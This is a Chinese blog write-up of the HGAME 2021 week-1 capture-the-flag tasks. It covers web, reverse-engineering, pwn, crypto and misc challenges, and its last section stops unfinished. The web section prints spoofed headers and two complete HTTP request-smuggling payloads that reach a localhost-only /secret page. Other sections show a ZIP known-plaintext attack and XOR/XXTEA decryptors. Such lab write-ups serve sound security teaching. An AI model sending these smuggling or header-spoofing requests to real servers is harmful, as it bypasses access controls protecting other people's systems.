---
title: 'hgame-week1-writeup'
date: 2021-01-30T21:35:00+08:00
draft: false
---
2021年hgameWeek1WP



# Web

## Hitchhiking_in_the_Galaxy

这题拿到手打开是这样

![404页面](https://i.loli.net/2021/02/02/GBDutjKv2pUg81Q.png)

那必然是直接冲去搭顺风车，url：http://hitchhiker42.0727.site:42420/HitchhikerGuide.php

然后 302 跳转回原来页面（这里记不太清了，写 wp 的时间已经是做题完3天后了）

直接把链接拿到 Postman 里头尝试不同的请求方式（这里第一时间没想到，是后来其他题目卡住了回来试这个）

![PostmanPage](https://i.loli.net/2021/02/02/sW1benLM23Ak5Zh.png)

发现使用 Post 请求回返回要求使用“无限非概率引擎”访问，将 UA 改为“Infinite Improbability Drive”得到：

![ChangeUA](https://i.loli.net/2021/02/02/TV2gAxWbC1u6tjk.png)

将 Referer 改为“https://cardinal.ink/”，请求得到：

![ChangeReferer](https://i.loli.net/2021/02/02/KFy1ib2kphJW8IM.png)

更改 X-Forwarded-For 为 “127.0.0.1” ，请求得到：

![ChangeX-Forwarded-For](https://i.loli.net/2021/02/02/2qyUYBFxG8o1uME.png)



hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}



## watermelon

![合成大西瓜](https://i.loli.net/2021/02/02/Q7qvYRlyX9aPitL.png)

拿到这个网页，先玩了亿把，然后开始分析网页源码。

先快速结束一局，发现结束后并网页没有向服务器发送请求，推测 js 中存在判断分数的语句，有可能 flag 就在js中

![image-20210202030019445](https://i.loli.net/2021/02/02/mhNk61MaiApYgbT.png)

经过分析，project.js 是游戏程序

因为题目要求的是分数超过 2000 分给 flag，所以尝试直接搜索 2000，但是没有找到

然后杀去分析了一下游戏结束后会触发哪些函数（挺蠢的，实际上再搜索一下 1999 就直接出答案了）

然后在 2087 行找到这个函数：

![image-20210202030418162](https://i.loli.net/2021/02/02/qPQWuGzOyKYli4U.png)

可以很明显看出这个函数负责 flag

直接把alert复制到控制台运行就行：

![image-20210202030532694](https://i.loli.net/2021/02/02/jxlu12FGbfKvXAq.png)

![image-20210202030542852](https://i.loli.net/2021/02/02/XeVCv8OHEcdpR2A.png)



hgame{do_you_know_cocos_game?}



## 宝藏走私者

这题卡了一天

刚开始请求要求说要本地访问（请求头无 client-ip），但是在请求头添加 client-ip 后发现还是不行，服务器获取到的 client-ip 是我的公网 ip

然后了解到[http走私](https://paper.seebug.org/1048/#511-te-cl)这种操作

用 burpsuite 构造一个 http 请求即可

![image-20210202154227940](https://i.loli.net/2021/02/02/X6o2CUfQ8bTig9A.png)

在发送请求之前记得把自动更新内容长度的勾取消掉

连续多次请求

```
GET /secret HTTP/1.1
Host: 951ec7e5e2.thief.0727.site
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
DNT:1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 5
Transfer-Encoding: chunked

0


GET /secret HTTP/1.1
Client-IP: 127.0.0.1
Host: 951ec7e5e2.thief.0727.site
Connection: close

```

![image-20210202030908852](https://i.loli.net/2021/02/02/vuW7XUFs9PCbwRJ.png)



hgame{HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!}



## 智商检测鸡

这道题挺。。检测智商的。

做了两题，然后分析了一下cookies，发现其中带有当前解决的题目的数量，再往下发现有一定的分析难度，索性直接写了个小脚本搞定

```python
import requests
import json
from bs4 import BeautifulSoup
session = requests.session()
r = session.get('http://r4u.top:5000/api/getQuestion')
soup = BeautifulSoup(r.content, "html.parser")
x2 = int(soup.find_all('mn')[0].get_text()) * -1
x1 = int(soup.find_all('mn')[1].get_text())
a = int(soup.find_all('mn')[2].get_text())
b = int(soup.find_all('mn')[3].get_text())
# print(soup.find_all('mn')[0].get_text())
answer = a/2*x1*x1+b*x1-a/2*x2*x2-b*x2
answer = round(answer, 2)
data = {"answer": answer}
r = session.post('http://r4u.top:5000/api/verify', json=data)
print(r.content)
status = json.loads(session.get('http://r4u.top:5000/api/getStatus').text)

while(status.get('solving') != 100):
    r = session.get('http://r4u.top:5000/api/getQuestion')
    soup = BeautifulSoup(r.content, "html.parser")
    x2 = int(soup.find_all('mn')[0].get_text()) * -1
    x1 = int(soup.find_all('mn')[1].get_text())
    a = int(soup.find_all('mn')[2].get_text())
    b = int(soup.find_all('mn')[3].get_text())
    answer = a/2*x1*x1+b*x1-a/2*x2*x2-b*x2
    answer = round(answer, 2)
    data = {"answer": answer}
    r = session.post('http://r4u.top:5000/api/verify', json=data)
    print(r.content)
    status = json.loads(session.get('http://r4u.top:5000/api/getStatus').text)
    print(status.get('solving'))
    print(session.cookies)
```

拿到cookies，用cookies访问网页即可



hgame{3very0ne_H4tes_Math}



## 走私者的愤怒

这一题的思路和宝藏走私者的思路应该是一样的

但是不知道为什么，用宝藏请求者的头去请求一直都拿不到东西

最后无奈问 Liki 姐姐，说是改成 POST 试一试

然后在第二个 GET 请求中加了一点点小改动拿到了 flag

```
GET /secret HTTP/1.1
Host: police.liki.link
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
DNT:1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 5
Transfer-Encoding: chunked

0


GET /secret HTTP/1.1
Client-IP: 127.0.0.1
Host: police.liki.link
Content-Length: 7

12345
```

![image-20210203012342461](https://i.loli.net/2021/02/03/7KBw8CsSWXi2Vab.png)

和宝藏走私者就差了三行，终于拿到了flag



hgame{Fe3l^tHe~4N9eR+oF_5mu9gl3r!!}





# Reverse

## apacha

拿到程序，丢进ida

找到主程序位置，按f5转换一下

![image-20210203032522810](https://i.loli.net/2021/02/03/jSeWa2oV7XsFpx4.png)

分析函数可以大概看出要输入一个长度为 35 的字符串，并且根据返回的信息可以看出flag的长度就是35

25 行那里调用了一个函数，判断大概率是将输入的f lag 加密的程序

双击跟过去看一眼

![image-20210203014929884](https://i.loli.net/2021/02/03/RaoQ3vmA1L9XtqN.png)

看到熟悉的异或，实锤了实锤了

回到主程序，第 26 行判断语句中调用的函数应该就是判断加密后的输入的字符串是否和加密后的flag相同

同样跟进去看

![image-20210203015352479](https://i.loli.net/2021/02/03/hKPwHXS6Ek7xWfA.png)

![image-20210203015425240](https://i.loli.net/2021/02/03/8jsHVfRzIu3kbTS.png)

这堆 4 看起来挺难受的，索性自己重新写一下这个函数

![image-20210203030859025](https://i.loli.net/2021/02/03/C4jIHa82pxGAtVy.png)

简化后的这个函数大概长这样，可以看出是从word[1]开始，和 unk_501C + 8 的地址上的值开始比较

同样在ida中跟过去看 unk_501C 地址之后的值

![image-20210203021040163](https://i.loli.net/2021/02/03/dbMY4pRHBhyPQXV.png)

这个比较可以看出密文第一位的值

![image-20210203020622911](https://i.loli.net/2021/02/03/3AGLMSbvl9j2hZn.png)

那么这样就能拼凑出一个完整的密文字符串：

```
0x0E74EB323, 0x0B7A72836, 0x59CA6FE2,  0x967CC5C1,  0x0E7802674,
0x3D2D54E6,  0x8A9D0356,  0x99DCC39C,  0x7026D8ED,  0x6A33FDAD,
0x0F496550A, 0x5C9C6F9E,  0x1BE5D04C,  0x6723AE17,  0x5270A5C2,
0x0AC42130A, 0x84BE67B2,  0x705CC779,  0x5C513D98,  0x0FB36DA2D,
0x22179645,  0x5CE3529D,  0x0D189E1FB, 0x0E85BD489, 0x73C8D11F,
0x54B5C196,  0x0B67CB490, 0x2117E4CA,  0x9DE3F994,  0x2F5AA1AA,
0x0A7E801FD, 0x0C30D6EAB, 0x1BADDC9C,  0x3453B04A,  0x92A406F9
```

再去分析加密的函数，发现很特殊的 1640531527

经过学长点拨，去查了了一下，发现是 XXTEA 加密，然后上 Github 找了一份现成的解密库，把解密的函数单独拉出来，写了个程序

```c
#include <stdio.h>
#include <string.h>
#define DELTA 0x9e3779b9
#define MX                                            \
    (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ \
        ((sum ^ y) + (key[(p & 3) ^ e] ^ z))
static unsigned int* xxtea_uint_decrypt(unsigned int* data,
                                        size_t len,
                                        unsigned int* key) {
    unsigned int n = (unsigned int)len - 1;
    unsigned int z, y = data[0], p, q = 6 + 52 / (n + 1), sum = q * DELTA, e;

    if (n < 1)
        return data;

    while (sum != 0) {
        e = sum >> 2 & 3;

        for (p = n; p > 0; p--) {
            z = data[p - 1];
            y = data[p] -= MX;
        }

        z = data[n];
        y = data[0] -= MX;
        sum -= DELTA;
    }

    return data;
}
int main() {
    unsigned int data2[35] = {
        0x0E74EB323, 0x0B7A72836, 0x59CA6FE2,  0x967CC5C1,  0x0E7802674,
        0x3D2D54E6,  0x8A9D0356,  0x99DCC39C,  0x7026D8ED,  0x6A33FDAD,
        0x0F496550A, 0x5C9C6F9E,  0x1BE5D04C,  0x6723AE17,  0x5270A5C2,
        0x0AC42130A, 0x84BE67B2,  0x705CC779,  0x5C513D98,  0x0FB36DA2D,
        0x22179645,  0x5CE3529D,  0x0D189E1FB, 0x0E85BD489, 0x73C8D11F,
        0x54B5C196,  0x0B67CB490, 0x2117E4CA,  0x9DE3F994,  0x2F5AA1AA,
        0x0A7E801FD, 0x0C30D6EAB, 0x1BADDC9C,  0x3453B04A,  0x92A406F9};
    unsigned int key[4] = {1, 2, 3, 4};
    xxtea_uint_decrypt(data2, 35, key);
    for (int i = 0; i < 35; i++) {
        printf("%c", (char)data2[i]);
    }
    return 0;
}

```

运行程序，输出flag，冲了。



hgame{l00ks_1ike_y0u_f0Und_th3_t34}



## helloRe

拿到一个exe文件

![image-20210202031918438](https://i.loli.net/2021/02/02/YKdMsnA2kHpVeWJ.png)

拿到ida中分析一下

找到主程序

![image-20210202032239684](https://i.loli.net/2021/02/02/dAuvV6hU3WkEjaN.png)

按F5，方便分析

![image-20210202032350293](https://i.loli.net/2021/02/02/DKkfFcr8Pumwzye.png)

发现在输出结果之前这一波操作似曾相识

盲猜是加密，然后看看其中用到了哪些变量

逆到最后发现就是下面这一坨被 xor 加密了

![image-20210202032153831](https://i.loli.net/2021/02/02/dLePHGA93NgZxBT.png)

xor的另外一部分就是个函数

看了下前面一堆没用的东西，重点就在最后一句，是变量--，直接杀去看变量，得出变量原始值是ff

![image-20210202032028560](https://i.loli.net/2021/02/02/5zXmerpEyVCIfAL.png)

![image-20210202032045672](https://i.loli.net/2021/02/02/V3YW2lOSQzvHZIc.png)

然后就是写个python程序获取flag就好了

```python
key = '\xff'
words = '\x97\x99\x9C\x91\x9E\x81\x91\x9D\x9B\x9A\x9A\xAB\x81\x97\xAE\x80\x83\x8F\x94\x89\x99\x97'
for word in words:
    print(chr(ord(word) ^ ord(key)), end='')
    key = chr(ord(key) - 1)

```



hgame{hello_re_player}



## pypy

![image-20210202033253588](https://i.loli.net/2021/02/02/DX1sgnRd4K7AxHf.png)

```
# your flag: 30466633346f59213b4139794520572b45514d61583151576638643a
```

pypy这题和python的dis有关，本来想直接分析的，无奈脑子不够用，只好逆回去写了原程序

```python
raw_flag = input('give me your flag:')
cipher = raw_flag[6:-1]
length = len(cipher)
for i in range(length/2):
    cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]
res = []
for i in range(length):
    res.append(ord(cipher[i]) ^ i)
res = bytes(hex(res))
return 0
```

然后就把步骤反过来就好了

这里我把密文先用hex解密解了再进行解密

```python
cipher = "0Ff34oY!;A9yE W+EQMaX1QWf8d:"
length = len(cipher)
words = []
for i in range(length):
    words.append(ord(cipher[i]) ^ i)
for i in range(int(length/2)):
    i = int(length/2)-i-1
    words[2*i], words[2*i+1] = words[2*i+1], words[2*i]
print(words)
for i in words:
    print(chr(i), end='')
```

> G00dj0&\_H3r3-I\$Y@Ur\_​\$L@G!\~!\~

得到的不能直接用，从原程序可以看出是掐头去尾了，所以补充头尾得到：

hgame{G00dj0&\_H3r3-I\$Y@Ur\_\$L@G!\~!\~}



# PWN

## whitegive

这里拿到的是编译好的程序和c语言文件

先看一下源码：

![image-20210202034533567](https://i.loli.net/2021/02/02/FRvcG4BIodmi9QN.png)

重点就在这两句话，所以只要让num变量的值等于“paSsw0rd”的首地址即可。因为这个“paSsw0rd”是常量，所以地址已经固定好了。

把程序拖入ida分析一波，直接Alt+T查找

![image-20210202034844300](https://i.loli.net/2021/02/02/DYFVNnim1EshjKS.png)

得到“paSsw0rd”的首地址402012，注意这个是16进制，得转为10进制输入

打开计算器转换得到4202514

![image-20210202035022524](https://i.loli.net/2021/02/02/KrTzMhDaOLJS7vY.png)

打开wsl：输入nc 182.92.108.71 30210回车

![image-20210202035240535](https://i.loli.net/2021/02/02/uNtCcMDd5S6KGso.png)

然后就可以输linux指令了，直接ls+cat：

![image-20210202035354285](https://i.loli.net/2021/02/02/jT5atR82eixonAC.png)



hgame{W3lCOme_t0_Hg4m3_2222Z222zO2l}



## SteinsGate2

## letter

## once



# Crypto

## まひと

这题提供了一坨莫斯电码

---../-..../-..-./.----/-----/----./-..-./.----/-----/---../-..-./.----/.----/-----/-..-./----./-----/-..-./---../--.../-..-./...../...--/-..-./.----/-----/---../-..-./----./----./-..-./.----/-----/----./-..-./---../...../-..-./.----/.----/-..../-..-./---../....-/-..-./--.../.----/-..-./.----/-----/---../-..-./.----/.----/....-/-..-./----./--.../-..-./---../....-/-..-./.----/.----/..---/-..-./...../--.../-..-./---../-..../-..-./.----/-----/----./-..-./.----/.----/-..../-..-./.----/.----/-..../-..-./.----/-----/-----/-..-./.----/-----/--.../-..-./.----/.----/..---/-..-./.----/-----/...../-..-./--.../...--/-..-./---../....-/-..-./--.../-----/-..-./---../----./-..-./.----/-----/-----/-..-./-..../----./-..-./--.../-----/-..-./...../..---/-..-./----./-----/-..-./---../...--/-..-./--.../-----/-..-./.----/.----/.----/-..-./----./----./-..-./-..../----./-..-./....-/---../-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./....-/---../-..-./....-/---../-..-./.----/.----/....-/-..-./--.../----./-..-./---../---../-..-./.----/-----/....-/-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./.----/.----/-----/-..-./--.../....-/-..-./---../...../-..-./---../....-/-..-./---../-..../-..-./...../--.../-..-./--.../----./-..-./----./--.../-..-./.----/.----/-----/-..-./...../...--/-..-./.----/-----/-..../-..-./---../...../-..-./.----/-----/----./-..-./----./----./-..-./....-/---../-..-./.----/-----/.----/-..-./-..../...../-..-./-..../.----/-..-./-..../.----

得出来这样一坨：

86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61

很明显的acsii码，然后转换后得到：

VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA==



很明显的base64，解码得到：

Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x



用Vigenere解码，key为Liki，得到：

}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n

要注意到一点栅栏密码不会移动第一个字符的位置，而且目标flag为hgame{......}，所以应该下一步的解密中需要进行逆序之类的操作

栅栏6：}!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu



逆序：utnzr{pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!}



凯撒13：hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!}



hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!}



## 对称之美

从题目就能看出这是一个考对称加密的题目

而且可以看出用的是xor加密法

![image-20210202040321352](https://i.loli.net/2021/02/02/uFoxJYcZeahOvEi.png)

想了一段时间，觉得爆破是最简单的解法，反正也就16位，然后就~~写了~~改了别人写的用Z3实现的爆破程序

```python
from __future__ import print_function
import sys
import hexdump
import math
import os
import random
from simanneal import Annealer

# requires https://github.com/perrygeo/simanneal

KEYLEN = 16


def xor_strings(s, t):
    # https://en.wikipedia.org/wiki/XOR_cipher#Example_implementation
    """xor two strings together"""
    return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))


def read_file(fname):
    file = open(fname, mode='rb')
    content = file.read()
    file.close()
    return content


def chunks(l, n):
    """divide input buffer by n-len chunks"""
    n = max(1, n)
    return [l[i:i + n] for i in range(0, len(l), n)]


trigrams = ["the", "and", "tha", "ent", "ing", "ion", "tio",
            "for", "nde", "has", "nce", "edt", "tis", "oft", "sth", "men"]
digrams = ["th", "he", "in", "er"]

# additional tuning may be needed:
BONUS_FOR_PRINTABLE = 1
BONUS_FOR_LOWERCASE = 3
BONUS_FOR_SPACE = 8
BONUS_FOR_DIGRAM = 8
BONUS_FOR_TRIGRAM = 16
PENALTY_FOR_DIGIT = -10


def fitness(state):
    fitness = 0
    state_as_string = "".join(map(chr, state))
    tmp = chunks(cipher_file, KEYLEN)
    plain = "".join(map(lambda x: xor_strings(x, state_as_string), tmp))
    for p in plain:
        if p in "qwertyuiopasdfghjklzxcvbnm":
            fitness = fitness+BONUS_FOR_LOWERCASE
        if p in "0123456789":
            fitness = fitness+PENALTY_FOR_DIGIT
        p = ord(p)
        if (p >= 0x20 and p <= 0x7E) or p == 0xA or p == 0xD:
            fitness = fitness+BONUS_FOR_PRINTABLE

    for digram in digrams:
        fitness = fitness + plain.count(digram)*BONUS_FOR_DIGRAM

    for trigram in trigrams:
        fitness = fitness + plain.count(trigram)*BONUS_FOR_TRIGRAM

    fitness = fitness + plain.count(" ")*BONUS_FOR_SPACE

    return fitness


class TestProblem(Annealer):

    def __init__(self, state):
        super(TestProblem, self).__init__(state)  # important!

    def move(self):
        # set random byte in state to random byte
        i = random.randint(0, len(self.state) - 1)
        self.state[i] = random.randint(0, 255)

    def energy(self):
        return -fitness(self.state)


# cipher_file=read_file("cipher1.txt")
cipher = b'H;<Z\x1a*=G \x14$\x06fT:Ab\x016\x17\x00\',[y@%\rfP$P/\r+C\x04o&Sy>,H6T![6\x01+PW ;\x15=F,\x1f/[/\x15 \t)V\x19,,\x15<U.\x00fZ<]\'\x1ae=\x18:=\x1by`%\x015\x15+Z7\x04!\x17\x15*iA1Qm\x07$_-V6\x1beC\x1f*$F<X;\r5\x19h? \x1d1\x17\x1e;iV8Zm\t*F\'\x150\r)V\x03*iA6\x14.\x07*Z:Fb\t+SWE&A1Q?H%Z%E-\x1b,C\x1e \'T5\x149\r%]&\\3\x1d DYE\x10Z,\x14 \t?\x15&Z6H7R\x16# O<\x14$\x1cj\x15*@6H<X\x02=iW+U$\x06f?!Fb\n0D\x0eo>Z+_$\x06!\x15*P*\x01+SW;!PyG.\r(P;\x156\x07eD\x12*"\x15S[8\x1cfF1X/\r1E\x0eo>]<Zm\x11)@hY-\x07.\x17\x16;iTyD,\x01(A![%Fe=#\',G<\x14,\x1a#\x15;P4\r7V\x1bo;P8G"\x065\x15.Z0H1_\x1e<g\x15\r\\(HLS!G1\x1ce^\x04o=]8@m\x1f#\x12:Pb\x00$E\x13b>\\+Q)H2ZhY-\x07.\x17\x11 ;\x15S]9Ffz=Gb\t+T\x1e*\'AyU#\x0b#F<Z0\x1beZ\x166i[6@m\x00\'C-\x15*\t!\x17}.i[8Y(H Z:\x15+\x1ci\x17\x15:=\x15-\\(\x11f^&P5H1_\x16;iA1Q$\x1af?\'B,H\'X\x13&,FyC(\x1a#\x15*T1\x01&V\x1b#0\x15*M \x05#A:\\!\t)\x1bW.:\x15SC(\x1a#\x15<]-\x1b \x17\x18)iE6@(\x062\\)Yb\x187R\x13.=Z+Gm\x074\x158G\'\x11k\x17}\x1b!P+Q+\x074Pd\x156\x00,DW,(X<\x14$\x06f])[&\x11e@\x1f*=]<Fmb%]\'Z1\x01+PW.iX8@(DfV)A!\x00,Y\x10o-\\7Z(\x1afZ:\x15H\t3X\x1e+ [>\x14/\r/[/\x15-\x06eC\x1f*iX<Z8H)ShTb\x1b+V\x05# [>\x18mb.@&R0\x11eG\x16,"\x156Rm\x1f)Y>P1H*EW-,T+Glb\x12T#Pb\te[\x18 "\x158@m\x11)@:\x15$\t&RW&\'\x15-\\(H+\\:G-\x1ae=\x16!-\x150Y,\x0f/[-\x15#H)^\x19*iF-F,\x01!]<\x15&\x072YW;!Py> \x01"Q$PlH\x1cX\x02h%YyG(\rfW\'A*H6^\x13*:\x156Rm\x11)@:\x15H\x0e$T\x12o(G<\x14=\x1a#A<Lb\x1b<Z\x1a*=G0W,\x04h\x15\x1c]+\x1be^\x04oC^7[:\x06fT;\x15 \x01)V\x03*;T5\x14>\x11+X-A0\x11eV\x19+i\\-\x13>HLB P0\reU\x18;!\x15*])\r5\x15-\\6\x00 EW< Q<\x14"\x0efA \\1HOS\x1e9 Q0Z*H*\\&Pb\t5G\x12.;\x154[?\rfZ:\x15.\r6DW;!PyG,\x05#\x1bBf-H-R\x05*i\\*\x149\x00#\x15.Y#\x0f\x7f\x17}\'.T4Q60vG\x17\\wE$h\x02\x1czS\x0c\x05f\\(QlS\x17&+N(\x0cxE\x11\x07?\x15L'
# print(len(cipher))
cipher_file = str(cipher, encoding="utf-8")

init_state = [0 for i in range(KEYLEN)]

test = TestProblem(init_state)
# increase if you're not satisfied with result:
test.steps = 200000
# since our state is just a list, slice is the fastest way to copy
test.copy_strategy = "slice"
#test.copy_strategy = "deepcopy"
state, e = test.anneal()

possible_key = "".join(map(chr, state))
print("state/key:")
# hexdump.hexdump(possible_key)

print("decrypted:")
tmp = chunks(cipher_file, KEYLEN)
plain = "".join(map(lambda x: xor_strings(x, possible_key), tmp))
print(plain)
# hexdump.hexdump(plain)

```

运行后结果马上就出了：

> Symmetry in art is when the elements of
> a painting or drawing balance each other
> out. This could be the objects themselves,
> but it can also relate to colors and
> other compositional techniques.
> You may not realize it, but your brain
> is busy working behind the scenes to seek
> out symmetry when you look at a painting.
> There are several reasons for this. The
> first is that we're hard-wired to look for
> it. Our ancient ancestors may not have had
> a name for it, but they knew that their
> own bodies were basically symmetrical, as
> were those of potential predators or prey.
> Therefore, this came in handy whether
> choosing a mate, catching dinner or
> avoiding being on the menu of a snarling,
> hungry pack of wolves or bears!
> Take a look at your face in the mirror
> and imagine a line straight down the
> middle. You'll see both sides of your
> face are pretty symmetrical. This is
> known as bilateral symmetry and it's
> where both sides either side of this
> dividing line appear more or less the same.
> So here is the flag:
> hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}



hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}



## Transformer

> 所有人都已做好准备,月黑之时即将来临,为了击毁最后的主控能量柱,打开通往芝加哥的升降桥迫在眉睫 看守升降桥的控制员已经失踪,唯有在控制台的小房间留下来的小纸条,似乎是控制员防止自己老了把密码忘记而写下的,但似乎都是奇怪的字母组合,唯一有价值的线索是垃圾桶里的两堆被碎纸机粉碎的碎纸,随便查看几张,似乎是两份文件,并且其中一份和小纸条上的字母规律有点相像 

![image-20210202055816035](https://i.loli.net/2021/02/02/pSe7Lis1CD4bvOh.png)

密文：Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk "qypth{hp5d_s0n_szi^3ic&qh11a_}",Dai'o sanyho oa pcc oqh dhpn po oqh hic.

这题根据题意“其中一份和小纸条上的字母规律有点相像”

将enc和ori中文件中的字符对应起来（我用文件大小排序，相同文件大小的文件往往就是对应的明文和密文）

少量对不上的文件也可以利用已知的子母对应关系找到未知字母的映射关系

![image-20210202060103061](https://i.loli.net/2021/02/02/t7DQEB6cbNVWJOP.png)

最后得出这么一个对应关系，左边为明文，右边为密文

写了个小程序将密文翻译过来：

```c
#include <stdio.h>
int main(){
    char map[26] = {'o','z','d','y','c','i','x','e','n','k','s','q','b','r','t','a','h','w','f','m','l','v','j','p','g','u'};
    char temp;
    while ((temp = getchar())!=0){
        if (temp>='a'&&temp<='z') printf("%c", map[temp-'a']);
        else printf("%c",temp);
    }
    return 0;
}
```

翻译得到：

The lift bridge console system has only used password login since 2003, the password is "hgame{ea5y_f0r_fun^3nd&he11o_}"
,Don't forget to add the year at the end.



hgame{ea5y_f0r_fun^3nd&he11o_}



# MISC

## Base全家福

这题没什么可说的

拿到base64密文：R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09

和题目一样base全家桶

base64-》base32-》base16

得到：

hgame{We1c0me_t0_HG4M3_2021}



## 不起眼压缩包的养成的方法

![image-20210202062515972](https://i.loli.net/2021/02/02/qoBxI6SyswaXmYW.png)

拿到的题目是一张图片，看题目很明显能想到将后缀改zip（用binwalk看一眼显然更严谨）

![image-20210202062644320](https://i.loli.net/2021/02/02/quV531Yif4U7FkM.png)

这边提到密码是八位的图片id，可以直接爆破出来，但我选择识图

得到zip密码：70415155    解压

查看其中NO PASSWORD.txt的内容

![image-20210202063024297](https://i.loli.net/2021/02/02/me2GxQR3dytLuEK.png)

提到有时候密码太强或者完全没什么用，以及他只用存储模式打包zip

查看另外一个文件plain.zip

![image-20210202063220587](https://i.loli.net/2021/02/02/4RLSVheNByf5k8K.png)

发现其中有一个同样的NO PASSWORD.txt（文件大小等完全相同），那么可以考虑使用明文攻击

先把NO PASSWORD.txt打成zip，压缩级别设为仅储存

![image-20210202063546112](https://i.loli.net/2021/02/02/4oVD2jN5iIMBKsZ.png)

然后打开AZPR，设定明文攻击参数

![image-20210202063649105](https://i.loli.net/2021/02/02/G7RVBMNubzKT8oY.png)

3秒出结果：C8uvP$DP

![image-20210202063717064](https://i.loli.net/2021/02/02/SIrG6PXiCxdpTeM.png)

解压plain.zip得到flag.zip

查看flag.zip，只有一个加密文件

![image-20210202063932277](https://i.loli.net/2021/02/02/dDvsg45UXVJmkEO.png)

没有任何提示，杀去看HEX

![image-20210202064246214](https://i.loli.net/2021/02/02/fIivUNZYjm1oBOR.png)

可以很明显看到flag.txt中的内容，取出，丢到unicode解码器，直接出flag



hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d}



## Galaxy

这题是拿到了一个wireshark的记录文件

打开筛选器，直接把http请求筛选出来

![image-20210202064817280](https://i.loli.net/2021/02/02/v8pFINY6EgnQTOh.png)

可以看到第一个请求/galaxy.png是200，而其他都是301，那么应该是从第一个请求入手

选中服务器返回的数据

![image-20210202065031414](https://i.loli.net/2021/02/02/ywvaMn65SBqPlup.png)

在下面选中“portable network ......”右键-》导出分组字节流，然后根据接收的文件类型，直接保存成png文件

![image-20210202065128405](https://i.loli.net/2021/02/02/Qg4wrxKf8ItMJcd.png)

![image-20210202065354780](https://i.loli.net/2021/02/02/eWc943qt2LhRAGK.png)

导出后发现用honeyView打不开，怀疑照片被改过，使用PCRT（可在github下载）尝试修复文件，发现是crc校验码出错，这里我走了弯路，选择修复校验码，但是还是打不开图片，兜兜转转弄了一个下午。

crc校验码只和png文件头（文件头相关知识一定要认真看）有关，所以校验码出错就意味着文件头遭到了修改，ctf的一种图片隐写操作就是修改图片高度来隐藏flag

所以找了个现成的轮子来计算正确的图片高度信息

https://www.cnblogs.com/vict0r/p/13258286.html

```python
import struct
import binascii
from Crypto.Util.number import bytes_to_long

img = open("galaxy.png", "rb").read()

for i in range(0xFFFF):
    stream = img[12:20] + struct.pack('>i', i) + img[24:29]
    crc = binascii.crc32(stream)
    if crc == bytes_to_long(img[29:33]):
        print(hex(i))
```

计算完得出图像高度数据块的值为0x1000，把图片用hex编辑器打开，修改高度部分的值

原始：

![image-20210202070425435](https://i.loli.net/2021/02/02/wbLkgarQ9xoP1ZI.png)

修改后：

![image-20210202070507587](https://i.loli.net/2021/02/02/OHtp87iBdV41PNy.png)

保存，图片可以打开

![image-20210202070559916](https://i.loli.net/2021/02/02/foKUu4GhkYXPznH.png)



hgame{Wh4t_A_W0nderfu1_Wa11paper}



## Word RE:MASTER

下载下来两个docx

打开first.docx

![image-20210202071757048](https://i.loli.net/2021/02/02/rhvE8dpjx5Bmgwt.png)

无隐藏文字，图片中不存在隐写

打开maimai.docx，发现需要密码

尝试将first.docx改名为first.zip，打开后发现有password.xml

![image-20210202072023288](https://i.loli.net/2021/02/02/nAeWZEilM5gvRO7.png)

vscode打开得到密文：

+++++ +++[- >++++ ++++< ]>+++ +.<++ +[->+ ++<]> ++.<+ ++[-> +++<] >+.<+ ++[-> ---<] >-.++ ++++. <+++[ ->--- <]>-. +++.+ .++++ ++++. <+++[ ->--- <]>-- ----. +.--- --..+ .++++ +++++ .<+++ [->-- -<]>- ----- .<

用brainfuck解码得到：DOYOUKNOWHIDDEN?

这里也给下面提示（隐藏字符）

用密码打开docx，发现只有一张照片

![image-20210202072445697](https://i.loli.net/2021/02/02/zrR9uXJKqlHkWTA.png)

进入菜单，打开显示隐藏文字、制表符、空格

![image-20210202072543419](https://i.loli.net/2021/02/02/8IVNTM4x2ukvJsE.png)

发现密文：

![image-20210202072654665](https://i.loli.net/2021/02/02/Ba4RzdFMlJxNcg6.png)

经过漫长的Google，终于明白这是snow隐写，图片中的“雪”这个提示我根本没有get到

